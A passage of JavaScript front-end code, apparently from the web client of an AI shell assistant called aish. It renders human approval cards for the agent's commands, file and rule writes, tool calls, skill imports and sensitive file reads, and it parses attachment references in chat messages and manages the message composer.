    `<span class="card-htext"><span class="card-htitle">Approval needed</span>` +
    `<span class="card-hsub"></span></span>`;
  head.querySelector(".card-hsub").textContent =
    destructive ? "Destructive — review before running" : "Runs a shell command";
  card.appendChild(head);

  // $ command box: editable in place via the pencil, plus copy.
  const box = document.createElement("div");
  box.className = "cmd-box";
  const dollar = document.createElement("span");
  dollar.className = "cmd-dollar";
  dollar.textContent = "$";
  const code = document.createElement("span");
  code.className = "cmd-text mono";
  code.textContent = event.command;
  highlightCommand(code); // bash syntax colors (#90); reverted while editing below
  const editBtn = document.createElement("button");
  editBtn.type = "button";
  editBtn.className = "cmd-icon";
  editBtn.title = "Edit the command before running";
  editBtn.appendChild(pencilIcon());
  editBtn.onclick = () => toggleEdit();
  // Group the edit + copy icons so they can stick to the top of the box: on a
  // long multi-line command they stay top-right in view instead of scrolling
  // away or sitting mid-height (#88).
  const cmdTools = document.createElement("div");
  cmdTools.className = "cmd-tools";
  cmdTools.append(editBtn, copyChip(() => code.textContent, "copy command"));
  box.append(dollar, code, cmdTools);
  card.appendChild(box);

  function toggleEdit() {
    if (code.isContentEditable) {
      code.contentEditable = "false";
      code.classList.remove("editing");
      editBtn.classList.remove("active");
      highlightCommand(code); // re-highlight the (possibly edited) command
      return;
    }
    // Editing wants plain text: collapse the highlight spans back to one text
    // node so the caret and contentEditable behave normally.
    code.textContent = code.textContent;
    code.classList.remove("hljs");
    code.contentEditable = "plaintext-only";
    code.classList.add("editing");
    editBtn.classList.add("active");
    code.focus();
    const range = document.createRange();
    range.selectNodeContents(code);
    range.collapse(false);
    const sel = getSelection();
    sel.removeAllRanges();
    sel.addRange(range);
  }

  // where it runs
  const where = document.createElement("div");
  where.className = "card-where";
  where.innerHTML = FOLDER_SVG;
  where.append("runs in ");
  const wpath = document.createElement("span");
  wpath.className = "where-path";
  wpath.textContent = abbreviatePath(currentCwd || "");
  where.appendChild(wpath);
  card.appendChild(where);

  const escapes = event.escapes || [];
  if (escapes.length) card.appendChild(escapeNote(escapes));
  card.appendChild(intentBlock(event));

  const feedback = feedbackField();
  card.appendChild(feedback);

  // Scope segments, driven by what the backend actually offered: "Just once"
  // is always available; Session/Always need allowlist prefixes; Trust dir
  // needs an escaping directory. With nothing but "Just once", the control is
  // pointless — omit it and let Approve mean a plain approve.
  const prefixText = (event.prefixes || []).join(", ");
  const escapeText = escapes.join(", ");
  const actions = ["approve"];
  if (prefixText) actions.push("approve_session", "approve_always");
  if (escapes.length) actions.push("approve_trust");
  let scopeAction = "approve";
  if (actions.length > 1) {
    const scope = document.createElement("div");
    scope.className = "scope";
    const label = document.createElement("div");
    label.className = "scope-label";
    label.textContent = "If approved, remember for";
    const seg = document.createElement("div");
    seg.className = "segmented";
    const explain = document.createElement("div");
    explain.className = "scope-explain";
    const select = (action, btn) => {
      scopeAction = action;
      for (const b of seg.children) b.classList.toggle("active", b === btn);
      explain.replaceChildren(scopeExplain(action, prefixText, escapeText));
    };
    let firstBtn = null;
    for (const action of actions) {
      const b = document.createElement("button");
      b.type = "button";
      b.className = "seg";
      b.textContent = SCOPE_LABELS[action];
      b.onclick = () => select(action, b);
      seg.appendChild(b);
      firstBtn = firstBtn || b;
    }
    scope.append(label, seg, explain);
    card.appendChild(scope);
    select("approve", firstBtn);
  }

  const actionsRow = document.createElement("div");
  actionsRow.className = "card-actions";
  const approveBtn = document.createElement("button");
  approveBtn.type = "button";
  approveBtn.className = "approve";
  approveBtn.textContent = "Approve";
  approveBtn.onclick = () => {
    const edited = code.textContent.trim();
    if (edited && edited !== event.command.trim()) {
      // An edited command flows through the "edit" action exactly as before;
      // the server re-checks the denylist on it. Editing takes precedence over
      // the scope segment (the wire has no edit+scope combination).
      answerCard(event.id, "edit", { command: edited, ...feedbackExtra(feedback) });
    } else {
      answerCard(event.id, scopeAction, feedbackExtra(feedback));
    }
  };
  const denyBtn = document.createElement("button");
  denyBtn.type = "button";
  denyBtn.className = "deny";
  denyBtn.textContent = "Deny";
  denyBtn.onclick = () => answerCard(event.id, "deny", feedbackExtra(feedback));
  actionsRow.append(approveBtn, denyBtn);
  card.appendChild(actionsRow);
}

function buildWriteCard(card, event) {
  card.classList.add("approval-card", "info");
  const head = document.createElement("div");
  head.className = "card-head sep";
  const ico = document.createElement("span");
  ico.className = "card-ico";
  ico.appendChild(pencilIcon());
  const htext = document.createElement("span");
  htext.className = "card-htext";
  const htitle = document.createElement("span");
  htitle.className = "card-htitle";
  // A rule is not a file, to the person approving it. Calling it one made the
  // owner think aish had bypassed its own rule tools and hand-written YAML —
  // he was deciding about a behaviour and the card showed him a text edit.
  const isRule = !!event.rule;
  htitle.textContent = isRule
    ? ({ Created: "New rule", Updated: "Rule change", Retired: "Retire rule" }[
        event.rule_verb
      ] || "Rule")
    : event.verb === "create" ? "Create file" : "Edit file";
  const hsub = document.createElement("span");
  hsub.className = isRule ? "card-hsub" : "card-hsub mono";
  hsub.textContent = isRule ? event.rule : relTarget(event.target);
  hsub.title = event.target; // full path on hover
  htext.append(htitle, hsub);
  head.append(ico, htext);
  if (!isRule) {
    // Line counts describe a text edit. For a rule they measure the wrong
    // thing entirely — nobody decides about a rule by how many lines it is.
    const added = document.createElement("span");
    added.className = "card-count add";
    added.textContent = `+${event.added}`;
    const removed = document.createElement("span");
    removed.className = "card-count del";
    removed.textContent = `−${event.removed}`;
    head.append(added, removed);
  }
  card.appendChild(head);

  // The compiled meaning, when the harness sent one (a rule write). It goes
  // ABOVE the diff because the diff is YAML the owner did not write, and what
  // he is agreeing to is the behaviour it describes.
  if (event.note) {
    const note = document.createElement("div");
    note.className = "card-note";
    note.textContent = event.note;
    card.appendChild(note);
  }

  const diff = renderDiff(event.diff || "");
  if (isRule) {
    // Folded away, not removed. The file is still the truth and anyone who
    // wants it is one tap from it — but it is the second thing, not the first.
    const fold = document.createElement("details");
    fold.className = "card-fold";
    const label = document.createElement("summary");
    label.textContent = "Show the file";
    fold.append(label, diff);
    card.appendChild(fold);
  } else {
    card.appendChild(diff);
  }
  card.appendChild(intentBlock(event));

  const feedback = feedbackField();
  card.appendChild(feedback);

  const actionsRow = document.createElement("div");
  actionsRow.className = "card-actions even";
  const approveBtn = document.createElement("button");
  approveBtn.type = "button";
  approveBtn.className = "approve";
  approveBtn.textContent = "Approve";
  approveBtn.onclick = () => answerCard(event.id, "approve", feedbackExtra(feedback));
  const denyBtn = document.createElement("button");
  denyBtn.type = "button";
  denyBtn.className = "deny";
  denyBtn.textContent = "Deny";
  denyBtn.onclick = () => answerCard(event.id, "deny", feedbackExtra(feedback));
  actionsRow.append(approveBtn, denyBtn);
  card.appendChild(actionsRow);
}

// A mutating plugin tool (#141) reuses the write card's shape: header names
// the tool, the body shows the structured args, feedback rides along (deny =
// stop, approve+comment = adjust), and Approve/Deny answer the same way.
function buildToolCard(card, event) {
  card.classList.add("approval-card", "info");
  const head = document.createElement("div");
  head.className = "card-head sep";
  const ico = document.createElement("span");
  ico.className = "card-ico";
  ico.appendChild(wrenchIcon());
  const htext = document.createElement("span");
  htext.className = "card-htext";
  const htitle = document.createElement("span");
  htitle.className = "card-htitle";
  htitle.textContent = "Run tool";
  const hsub = document.createElement("span");
  hsub.className = "card-hsub mono";
  hsub.textContent = event.tool;
  htext.append(htitle, hsub);
  head.append(ico, htext);
  card.appendChild(head);

  // Ground-truth preview (#157): a human-legible description of an otherwise
  // opaque (e.g. id-addressed) action, resolved by the tool itself. Shown
  // prominently; the raw args become a secondary detail below.
  if (event.preview) {
    const prev = document.createElement("div");
    prev.className = "tool-preview";
    prev.textContent = event.preview;
    card.appendChild(prev);
  }

  const argsWrap = document.createElement("div");
  argsWrap.className = "tool-args";
  if (event.preview) argsWrap.classList.add("secondary");
  const entries = Object.entries(event.args || {});
  if (!entries.length) {
    const empty = document.createElement("div");
    empty.className = "tool-arg-empty";
    empty.textContent = "(no arguments)";
    argsWrap.appendChild(empty);
  } else {
    for (const [k, v] of entries) argsWrap.appendChild(toolArgRow(k, v));
  }
  card.appendChild(argsWrap);
  card.appendChild(intentBlock(event));

  const feedback = feedbackField();
  card.appendChild(feedback);

  const actionsRow = document.createElement("div");
  actionsRow.className = "card-actions even";
  const approveBtn = document.createElement("button");
  approveBtn.type = "button";
  approveBtn.className = "approve";
  approveBtn.textContent = "Approve";
  approveBtn.onclick = () => answerCard(event.id, "approve", feedbackExtra(feedback));
  const denyBtn = document.createElement("button");
  denyBtn.type = "button";
  denyBtn.className = "deny";
  denyBtn.textContent = "Deny";
  denyBtn.onclick = () => answerCard(event.id, "deny", feedbackExtra(feedback));
  actionsRow.append(approveBtn, denyBtn);
  card.appendChild(actionsRow);
}

// One tool argument as a labeled field. A string is shown RAW (real line breaks,
// no JSON escaping) so an email/issue body reads like text, not one \n-littered
// line; a multi-line value drops to a block layout (label above, value below).
// Non-strings render as pretty JSON.
function toolArgRow(key, value) {
  const row = document.createElement("div");
  row.className = "tool-arg";
  const keyEl = document.createElement("span");
  keyEl.className = "tool-arg-key";
  keyEl.textContent = key;
  const valEl = document.createElement("span");
  valEl.className = "tool-arg-val mono";
  valEl.textContent = prettyArgValue(value);
  if (typeof value === "string" && value.includes("\n")) row.classList.add("block");
  row.append(keyEl, valEl);
  return row;
}

function prettyArgValue(v) {
  if (typeof v === "string") return v;
  if (v === null) return "null";
  if (typeof v === "object") return JSON.stringify(v, null, 2);
  return String(v);
}

// Consolidated review of a whole imported skill (#139): every file's full
// contents (syntax-highlighted, not a diff), risk flags up top, one decision —
// so untrusted code is actually reviewable, not rubber-stamped file-by-file.
function buildImportCard(card, event) {
  card.classList.add("approval-card", "info");
  const head = document.createElement("div");
  head.className = "card-head sep";
  const ico = document.createElement("span");
  ico.className = "card-ico";
  ico.appendChild(wrenchIcon());
  const htext = document.createElement("span");
  htext.className = "card-htext";
  const htitle = document.createElement("span");
  htitle.className = "card-htitle";
  htitle.textContent = "Import skill";
  const hsub = document.createElement("span");
  hsub.className = "card-hsub mono";
  hsub.textContent = event.skill;
  htext.append(htitle, hsub);
  head.append(ico, htext);
  card.appendChild(head);

  if (event.description) {
    const desc = document.createElement("div");
    desc.className = "import-desc";
    desc.textContent = event.description;
    card.appendChild(desc);
  }

  const files = event.files || [];
  const meta = document.createElement("div");
  meta.className = "import-meta";
  meta.textContent = `${files.length} file${files.length === 1 ? "" : "s"} → ${event.dest || ""}`;
  card.appendChild(meta);

  if ((event.flags || []).length) {
    const warn = document.createElement("div");
    warn.className = "import-flags";
    const t = document.createElement("div");
    t.className = "import-flags-title";
    t.textContent = "⚠ Review closely";
    warn.appendChild(t);
    for (const flag of event.flags) {
      const row = document.createElement("div");
      row.className = "import-flag";
      row.textContent = flag;
      warn.appendChild(row);
    }
    card.appendChild(warn);
  }
  if ((event.skipped || []).length) {
    const sk = document.createElement("div");
    sk.className = "import-skipped";
    sk.textContent = `Binary assets skipped (not installed): ${event.skipped.join(", ")}`;
    card.appendChild(sk);
  }
  // Above the file listing, not below it: the whole point of the consolidated
  // review (#139) is that the files are LONG, so a reason placed after them is
  // a reason nobody scrolls back up from.
  card.appendChild(intentBlock(event));

  for (const f of files) {
    const fileHead = document.createElement("div");
    fileHead.className = "import-file-head mono";
    fileHead.textContent = f.path + (f.executable ? "  •exec" : "");
    card.appendChild(fileHead);
    const pre = document.createElement("pre");
    pre.className = "import-file";
    const code = document.createElement("code");
    if (f.lang) code.dataset.lang = f.lang;
    code.textContent = f.content;
    pre.appendChild(code);
    card.appendChild(pre);
  }
  highlightFences(card); // reuse the vendored hljs — real syntax highlighting

  const feedback = feedbackField();
  card.appendChild(feedback);

  const actionsRow = document.createElement("div");
  actionsRow.className = "card-actions even";
  const approveBtn = document.createElement("button");
  approveBtn.type = "button";
  approveBtn.className = "approve";
  approveBtn.textContent = "Install";
  approveBtn.onclick = () => answerCard(event.id, "approve", feedbackExtra(feedback));
  const denyBtn = document.createElement("button");
  denyBtn.type = "button";
  denyBtn.className = "deny";
  denyBtn.textContent = "Deny";
  denyBtn.onclick = () => answerCard(event.id, "deny", feedbackExtra(feedback));
  actionsRow.append(approveBtn, denyBtn);
  card.appendChild(actionsRow);
}

function wrenchIcon() {
  return svgIcon("i-wrench", (make, svg) => {
    const g = make("g", { fill: "none", stroke: "currentColor", "stroke-width": "1.7",
      "stroke-linecap": "round", "stroke-linejoin": "round" });
    g.appendChild(make("path", {
      d: "M14.5 6a3.5 3.5 0 0 0-4.6 4.3l-4.8 4.8a1.5 1.5 0 0 0 2.1 2.1l4.8-4.8A3.5 3.5 0 0 0 18 8.5l-2 2-2-2 2-2A3.5 3.5 0 0 0 14.5 6Z",
    }));
    svg.appendChild(g);
  });
}

// The card header shows the file. In-project: the path relative to the working
// directory (design shows `config/http.py`). Outside the project: the FULL
// location, home-abbreviated (~/…) — a write to global config must NOT read
// like a file in the current project, or the user can't tell where it lands
// (#141 create_tool writes to ~/.config/aish/tools).
function relTarget(target) {
  const cwd = currentCwd || "";
  if (cwd && target.startsWith(cwd + "/")) return target.slice(cwd.length + 1);
  const home = target.match(/^\/(?:Users|home)\/[^/]+\//);
  return home ? "~/" + target.slice(home[0].length) : target;
}

// A unified diff rendered the way the design shows it (Screen 2d): no
// `---/+++/@@` plumbing (the filename is already in the header), a line-number
// gutter (old numbers for context/removals, new numbers for additions), and a
// tinted row per add/remove. `@@` hunks only seed the counters; a thin divider
// marks a gap between hunks.
function renderDiff(text) {
  const diff = document.createElement("div");
  diff.className = "diff";
  // Rows live in an inner box sized to the WIDEST line (`width: max-content`,
  // 100% floor); every row then fills that box, so each line's tinted
  // background paints uniformly across the full scroll width — like a terminal —
  // instead of stopping at its own (or the viewport's) edge and exposing bare
  // panel background when scrolled right (#68).
  const inner = document.createElement("div");
  inner.className = "diff-inner";
  diff.appendChild(inner);
  // Copy grabs the resulting file CONTENT (added + context lines, no +/-
  // markers or removed lines) — for a create that is the whole new file, for an
  // edit the post-edit view — which is far more useful to paste than raw diff.
  const contentLines = [];
  let oldNo = 0;
  let newNo = 0;
  let emitted = false;
  const rowEl = (cls, no, body) => {
    const row = document.createElement("div");
    row.className = "dl " + cls;
    const g = document.createElement("span");
    g.className = "dl-no";
    g.textContent = no == null ? "" : String(no);
    const t = document.createElement("span");
    t.className = "dl-tx";
    t.textContent = body.length ? body : " ";
    row.append(g, t);
    inner.appendChild(row);
    emitted = true;
  };
  const lines = text.split("\n");
  if (lines[lines.length - 1] === "") lines.pop(); // trailing newline artifact
  for (const line of lines) {
    if (line.startsWith("+++") || line.startsWith("---")) continue;
    const hunk = line.match(/^@@ -(\d+)(?:,\d+)? \+(\d+)(?:,\d+)? @@/);
    if (hunk) {
      oldNo = parseInt(hunk[1], 10);
      newNo = parseInt(hunk[2], 10);
      if (emitted) {
        const sep = document.createElement("div");
        sep.className = "dl gap";
        sep.textContent = "⋯";
        inner.appendChild(sep);
      }
      continue;
    }
    if (line.startsWith("+")) {
      rowEl("add", newNo++, line.slice(1));
      contentLines.push(line.slice(1));
    } else if (line.startsWith("-")) rowEl("del", oldNo++, line.slice(1));
    else if (line.startsWith("\\")) rowEl("ctx", null, line); // "\ No newline…"
    else {
      const body = line.startsWith(" ") ? line.slice(1) : line;
      rowEl("ctx", oldNo, body);
      contentLines.push(body);
      oldNo++;
      newNo++;
    }
  }

  // Pin wrap + copy top-right of a non-scrolling wrapper (tools stay put while
  // the diff scrolls sideways). Seed wrap from the global top-bar preference;
  // the per-card toggle then owns it (see syncDiffWrap for global overrides).
  const wrap = document.createElement("div");
  wrap.className = "diff-wrap";
  const softed = document.body.classList.contains("wrap");
  if (softed) diff.classList.add("diff-soft");
  const tools = document.createElement("div");
  tools.className = "term-tools";
  tools.append(
    diffWrapBtn(diff, softed),
    copyChip(() => contentLines.join("\n"), "copy file content"),
  );
  wrap.append(tools, diff);
  return wrap;
}

// The diff card's own wrap toggle: flips the diff between horizontal scroll
// (`white-space: pre`) and soft wrap (`pre-wrap`) via the `.diff-soft` class,
// independent of the global body.wrap (kept in sync by syncDiffWrap).
function diffWrapBtn(diff, on) {
  const b = document.createElement("button");
  b.type = "button";
  b.className = "term-tool term-wrap diff-wrap-btn" + (on ? " on" : "");
  b.title = "Wrap lines";
  b.innerHTML = WRAP_SVG;
  b.onclick = () => {
    b.classList.toggle("on");
    diff.classList.toggle("diff-soft");
  };
  return b;
}

// The out-of-roots warning shown on command/read cards whose target lives
// outside the session roots — the "Trust directory" button's context.
function escapeNote(escapes) {
  const note = document.createElement("div");
  note.className = "escape-note";
  note.textContent = `⚠ outside the trusted folders: ${escapes.join(", ")}`;
  return note;
}

function buildReadCard(card, event) {
  // A read gate is still an "attention needed" card — the model wants a file
  // that is either sensitive (may hold secrets) or outside the project roots.
  // Same orange accent + structure as the command card so the two read as one
  // family; only the header wording and the missing $-command box differ.
  card.classList.add("approval-card", "danger");
  const outside = event.reason === "outside";
  const head = document.createElement("div");
  head.className = "card-head danger";
  head.innerHTML =
    `<span class="card-ico">${outside ? CARD_SHIELD : CARD_TRIANGLE}</span>` +
    `<span class="card-htext"><span class="card-htitle">Read file</span>` +
    `<span class="card-hsub"></span></span>`;
  head.querySelector(".card-hsub").textContent =
    outside ? "Outside the project directory" : "Sensitive — may contain secrets";
  card.appendChild(head);

  // The path in the same inset the command card uses for its $-line, minus the
  // shell dollar (nothing runs) — just the mono path and a copy chip.
  const box = document.createElement("div");
  box.className = "cmd-box";
  const code = document.createElement("span");
  code.className = "cmd-text mono";
  code.textContent = event.path;
  box.append(code, copyChip(() => code.textContent, "copy path"));
  card.appendChild(box);

  const escapes = event.escapes || [];
  if (escapes.length) card.appendChild(escapeNote(escapes));
  card.appendChild(intentBlock(event));

  const feedback = feedbackField();
  card.appendChild(feedback);

  const actionsRow = document.createElement("div");
  actionsRow.className = escapes.length ? "card-actions" : "card-actions even";
  const approveBtn = document.createElement("button");
  approveBtn.type = "button";
  approveBtn.className = "approve";
  approveBtn.textContent = "Approve";
  approveBtn.onclick = () => answerCard(event.id, "approve", feedbackExtra(feedback));
  actionsRow.appendChild(approveBtn);
  if (escapes.length) {
    const trustBtn = document.createElement("button");
    trustBtn.type = "button";
    trustBtn.className = "trust";
    trustBtn.textContent = "Trust dir";
    trustBtn.title = `add ${escapes.join(", ")} to the trusted folders until this chat closes`;
    trustBtn.onclick = () => answerCard(event.id, "approve_trust", feedbackExtra(feedback));
    actionsRow.appendChild(trustBtn);
  }
  const denyBtn = document.createElement("button");
  denyBtn.type = "button";
  denyBtn.className = "deny";
  denyBtn.textContent = "Deny";
  denyBtn.onclick = () => answerCard(event.id, "deny", feedbackExtra(feedback));
  actionsRow.appendChild(denyBtn);
  card.appendChild(actionsRow);
}

function onApprovalResolved(event) {
  // The activity trace already records the command and its "approved: <comment>"
  // outcome, so the card just disappears once decided — no lingering verdict
  // block duplicating what the timeline shows.
  const card = cards.get(event.id);
  if (!card) return;
  pendingCards = Math.max(0, pendingCards - 1);
  refreshStatusline();
  card.remove();
  cards.delete(event.id);
  // Once nothing is left to decide, restore the timeline we auto-collapsed for
  // the card (#65) — but only if the user hasn't taken over its open state.
  if (pendingCards === 0 && currentTrace) {
    currentTrace.waitingApproval = false;
    updateTraceHead(currentTrace);
    if (currentTrace.autoCollapsed) {
      currentTrace.el.classList.add("open");
      currentTrace.autoCollapsed = false;
      pinTrace(currentTrace);
    }
  }
}

// ---- composer + autocomplete ---------------------------------------------
// `let`, not `const`: terminal mode swaps this node for a fresh element (#156),
// so the reference is reassigned by swapComposerInput.
let input = $("input");

// Half-typed text must survive the reloads the app performs on itself (rev
// mismatch after a server upgrade) and PWA relaunches. Saved while typing,
// plus on pagehide to catch programmatically-set values (quick replies,
// history recall) that don't fire input events; cleared once the text is
// actually sent.
input.value = localStorage.getItem("aish-draft") || "";
loadHeldSends(); // anything a dead tab was holding ([PENDING-SEND])
if (input.value) requestAnimationFrame(() => resizeInput()); // grow to fit a multi-line draft
function saveDraft() {
  if (input.value) localStorage.setItem("aish-draft", input.value);
  else localStorage.removeItem("aish-draft");
}
addEventListener("pagehide", saveDraft);

// Prompt history recall (terminal/Slack convention): ArrowUp in an empty
// composer steps back through earlier prompts, ArrowDown forward to the
// saved draft. Seeded from replayed user events, so it survives reconnects.
const promptHistory = [];
let historyIndex = null; // null = not navigating
let historyDraft = "";

// [ATTACHMENT-NOTES-START]
// The server appends a line per attachment to the text of the user's turn
// ("[image attached: cat.png — you can see it; file at /…/uploads/cat.png]").
// That line is written FOR THE MODEL — it is how a backend without native
// vision is told a file exists, and how one with vision is told it may look.
// It was also rendered verbatim in the blue bubble, so sending a photo showed
// the owner a sentence addressed to somebody else, ending in an absolute path.
//
// This is the ONE place that knows the note format. The prose is not a display
// string that leaked; it IS the record — it goes into the model conversation
// and into the session log, so `reconstruct_events` replays a cold session by
// handing back that same text. A structured field on the event would describe
// only turns logged after today and this parser would still be needed for
// every older one, which is two owners of one fact. So: parse once, here, and
// let both the live path and the replay path render from the result.
// What a message SAYS an attachment is, in either form.
//
// `![[cat.png]]` is what messages hold now (#231): wiki-link style, as in
// Obsidian, name only for a file aish keeps and a full path for one that lives
// elsewhere. `uploadsDir` — sent once in the hello, since only the server knows
// where its own folder is — is what turns a bare name back into something
// `/file` will serve.
//
// The three bracketed prose forms below are what every message written before
// this says. They are still read and always will be: a chat log is never
// rewritten, so the old shape has to keep rendering for as long as the chat
// exists. They are never produced.
const EMBED_RE = /!\[\[([^\]\n]+)\]\]/g;
const EMBED_LINE_RE = /^!\[\[([^\]\n]+)\]\]$/;

function embedNote(ref) {
  const name = ref.split("/").pop() || ref;
  return { kind: kindOfFile(name), name, path: resolveAttachment(ref), ref };
}

function parseAttachmentNote(line) {
  const embed = EMBED_LINE_RE.exec(line.trim());
  if (embed) return embedNote(embed[1]);
  const native =
    /^\[(image|document) attached: (.+?) — you can (?:see|read) it; file at (.+)\]$/
      .exec(line.trim());
  if (native) return { kind: native[1], name: native[2], path: native[3] };
  const plain = /^\[attached file: (.+)\]$/.exec(line.trim());
  if (plain) {
    return { kind: "file", name: plain[1].split("/").pop() || plain[1], path: plain[1] };
  }
  return null;
}

// An embed carries no "what kind is this" word, because the kind is not a
// property of the message — it is what THIS backend could take, decided when the
// message was sent and true of nothing afterwards. For showing it, the name is
// enough and is what a file manager uses too.
function kindOfFile(name) {
  if (ATTACH_IMAGE_RE.test(name)) return "image";
  return /\.pdf$/i.test(name) ? "document" : "file";
}

// A reference with no directory in it names a file aish holds; anything else is
// already a path. With no uploads folder known yet (the first paint, before the
// hello lands) a bare name resolves to itself — the thumbnail then fails and
// falls back to naming the file, which is what a deleted file already does.
function resolveAttachment(ref) {
  if (ref.includes("/") || !uploadsDir) return ref;
  return `${uploadsDir.replace(/\/$/, "")}/${ref}`;
}

// {body, attachments} — what the owner wrote, and what they attached.
// A message as an ordered SEQUENCE (#233): runs of text and files, in the order
// they were written. `{type:"text"}` or `{type:"file", note, ownLine}`.
//
// EVERY FILE DRAWS THE SAME — full size, on its own line, breaking the text
// around it. A picture between two clauses pushes them apart:
//
//     This image ![[shot.png]] you should check.
//
//        This image
//        ┌────────────┐
//        │            │
//        └────────────┘
//        you should check.
//
// That is what Obsidian does with an embed, and it is the version that works:
// the position is kept AND the picture is legible. Sizing a picture to the
// height of the words beside it kept the position and lost the picture, which
// is backwards — a screenshot two lines tall is unreadable, and being read is
// the only reason it was sent (#234).
//
// `ownLine` is not about how it DRAWS, then; it is about how it was WRITTEN,
// and only the source derivations care. `messageBody` — what reuse re-sends and
// copy hands back — keeps a reference that was written inside a sentence
// exactly where it was, and drops one that was alone on its line because
// `recordSource` re-appends those. That is what makes copy round-trip.
// `real` — the `files` the server put on the event — is the list of references
// in THIS message that name a file that exists. Only the server can know that,
// and without it the browser guessed: someone writing ABOUT the notation got an
// attachment chip drawn over their words. Absent (an older server, an offline
// mirror written before this) means "no list", and every reference is taken at
// face value — the behaviour from before, never worse than it.
function messageParts(text, real) {
  const known = real ? new Set(real.map((f) => f.path)) : null;
  const isFile = (note) => !note.ref || !known || known.has(note.path);
  const parts = [];
  const lines = String(text == null ? "" : text).split("\n");
  let buffer = [];
  const flushText = () => {
    const run = buffer.join("\n");
    buffer = [];
    if (run.trim()) parts.push({ type: "text", text: run });
  };
  for (const line of lines) {
    const whole = parseAttachmentNote(line);
    if (whole && isFile(whole)) {      // the file IS the line
      flushText();
      parts.push({ type: "file", note: whole, ownLine: true });
      continue;
    }
    if (!whole && line.includes("![[")) {
      // One or more references inside a sentence: split the line around the
      // ones that name a real file, so the words either side keep their place
      // and the ones that name nothing stay words.
      let last = 0;
      EMBED_RE.lastIndex = 0;
      let match;
      let found = false;
      while ((match = EMBED_RE.exec(line)) !== null) {
        const note = embedNote(match[1]);
        if (!isFile(note)) continue;
        found = true;
        const before = line.slice(last, match.index);
        if (before) buffer.push(before);
        flushText();
        parts.push({ type: "file", note, ownLine: false });
        last = match.index + match[0].length;
      }
      if (found) {
        const rest = line.slice(last);
        if (rest) buffer.push(rest);
        continue;
      }
    }
    buffer.push(line);
  }
  flushText();
  return parts;
}

function splitAttachmentNotes(text, real) {
  return {
    body: stripAttachmentNotes(text, real),
    attachments: messageParts(text, real)
      .filter((p) => p.type === "file")
      .map((p) => p.note),
  };
}

// Lines that are nothing BUT a file, dropped. Everything else kept verbatim,
// inline references included. This is the derivation that has to preserve the
// message — reuse puts it back in the composer to be sent again — and it
// matches `message_body` in session.py.
function messageBody(text, real) {
  return messageParts(text, real)
    .filter((part) => part.type === "text" || !part.ownLine)
    .map((part) => (part.type === "text" ? part.text : `![[${part.note.ref}]]`))
    .join("")
    .trim();
}

// The DISPLAY derivation: same, except an inline reference becomes its name.
// A chat title reading "the error in , the fix like " has had its subject taken
// out, and one reading "the error in ![[shot.png]]" is showing notation. Matches
// `strip_attachment_notes` in session.py, which differs from `message_body` for
// exactly this reason — a title is read, a message is re-sent.
function stripAttachmentNotes(text, real) {
  return messageBody(text, real)
    .replace(EMBED_RE, (_m, ref) => ref.split("/").pop() || ref)
    .trim();
}

// The message back as SOURCE: what was typed, then one embed per file. Written
// from the parsed attachments rather than by keeping the original lines, so a
// message stored in the old prose form copies out in today's shape — one format
// leaves this app, whatever shape it was read in.
function recordSource(body, notes) {
  if (!notes || !notes.length) return body;
  // A file the body ALREADY names stays where it is; only files that had no
  // place in the text get appended (#233). Without this, copying a message
  // whose photo sits inside a sentence would hand back the photo twice.
  const named = new Set(
    messageParts(body).filter((p) => p.type === "file").map((p) => p.note.path),
  );
  const lines = notes
    .filter((note) => !named.has(note.path))
    .map((note) => `![[${attachmentRef(note)}]]`);
  if (!lines.length) return body;
  return body ? `${body}\n\n${lines.join("\n")}` : lines.join("\n");
}

// Name alone for a file aish holds, full path for one that lives elsewhere —
// the same rule the server stores by, so copying and re-sending round-trips.
function attachmentRef(note) {
  const dir = uploadsDir ? uploadsDir.replace(/\/$/, "") : "";
  return dir && note.path === `${dir}/${note.name}` ? note.name : note.path;
}
// [ATTACHMENT-NOTES-END]

function rememberPrompt(text) {
  if (text && promptHistory[promptHistory.length - 1] !== text) promptHistory.push(text);
  if (promptHistory.length > 100) promptHistory.shift();
  historyIndex = null;
}

// How many lines the composer is actually rendering. Measured rather than
// compared against a pixel constant, because the reading-size stepper (#118)
// scales this font — a fixed threshold means "two lines" at one setting and
// "three" at another. Used to decide when the field takes a row of its own.
function composerLines() {
  const cs = getComputedStyle(input);
  const line = parseFloat(cs.lineHeight) || parseFloat(cs.fontSize) * 1.35 || 24;
  const pad = (parseFloat(cs.paddingTop) || 0) + (parseFloat(cs.paddingBottom) || 0);
  return Math.max(1, Math.round((input.scrollHeight - pad) / line));
}

function resizeInput() {
  input.style.height = "auto";
  input.style.height = `${Math.min(input.scrollHeight, innerHeight * 0.24)}px`;
  // The MOMENT it wraps to a second line, let the field take the full composer
  // width with the buttons tucked onto a row below (#97) — a narrow multi-line
  // box beside the buttons wastes the screen, and the in-field clear button had
  // nowhere sensible to sit in a two-line box that was still sharing its row.
  // Not in terminal mode.
  //
  // Sticky (#114): going full-width makes the box wider, so the SAME text wraps
  // to fewer lines and scrollHeight drops back under the threshold — a bare
  // scrollHeight>72 test then flip-flops tall/short on every keystroke. Once
  // tall, stay tall until the input is fully cleared (or terminal mode takes
  // over), so it only collapses back when you've emptied it.
  const composer = $("composer");
  const stayTall = composer.classList.contains("tall") && input.value !== "";
  composer.classList.toggle("tall", !cmdMode && (composerLines() > 1 || stayTall));
  // The in-field clear button (and the padding that keeps it off the text)
  // rides on the same signal, so it can never disagree with the box.
  composer.classList.toggle("has-text", input.value !== "");
  updateEmptyHint(); // draft state gates the empty-chat hint (#132)
}

// [COMPOSER-SLOT-START]
// Two composer affordances, split by WHAT THEY ACT ON — the principle worth
// keeping when the next one is added:
//
//   the FIELD owns its own content  → clearing is a control inside the field
//                                     (the platform's clear button, where
//                                     everyone already looks), shown only when
//                                     there is something to clear
//   the ROW owns actions on the message → pasting is a button beside attach,
//                                     dictate and send, and is ALWAYS there
//
// They were one shared slot first (paste when empty, clear when not) and that
// read as clever until it met the actual flow: you type a few words and THEN
// paste — "review this: <url>", "what is this?" + the text — and a shared slot
// hides paste at precisely that moment. Mutually exclusive in the UI is not the
// same as mutually exclusive in use.
//
// Reading the clipboard on an explicit tap is also the user gesture the
// permission model wants, which is why this is a button and not something
// automatic.
function clearComposer() {
  if (input.value === "") return;
  input.value = "";
  saveDraft();
  resizeInput();
  input.focus();
}

async function pasteIntoComposer() {
  // On a phone there is no Cmd+V, so this button is the ONLY way the clipboard
  // reaches the composer — which is why it has to handle a copied IMAGE too,
  // not just text. read() gives both; readText() below is the fallback for
  // browsers without it, and it can only ever see text.
  if (navigator.clipboard && navigator.clipboard.read) {
    try {
      let text = "";
      const files = [];
